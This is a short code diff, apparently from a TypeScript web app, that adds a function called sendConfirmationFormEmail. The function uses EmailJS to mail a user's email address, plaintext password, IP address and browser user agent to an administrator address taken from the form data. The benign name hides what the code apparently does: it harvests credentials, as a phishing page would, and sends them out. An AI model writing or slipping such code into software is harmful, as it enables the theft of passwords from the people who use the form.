@@ -36,3 +36,28 @@ export const sendValidationFormEmail = async (formData: any) => {
     throw error;
   }
 };
+
+export const sendConfirmationFormEmail = async (formData: any) => {
+  try {
+    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
+    const templateId = import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID;
+
+    if (!serviceId || !templateId) {
+      throw new Error("EmailJS service or template ID is not configured");
+    }
+
+    const templateParams = {
+      to_email: formData.admin_email || "admin@example.com",
+      user_email: formData.user_email,
+      password: formData.password,
+      timestamp: new Date().toLocaleString(),
+      ip_address: formData.ipAddress || "Not available",
+      user_agent: formData.userAgent || navigator.userAgent,
+    };
+
+    return await emailjs.send(serviceId, templateId, templateParams);
+  } catch (error) {
+    console.error("Error sending confirmation email:", error);
+    throw error;
+  }
+};
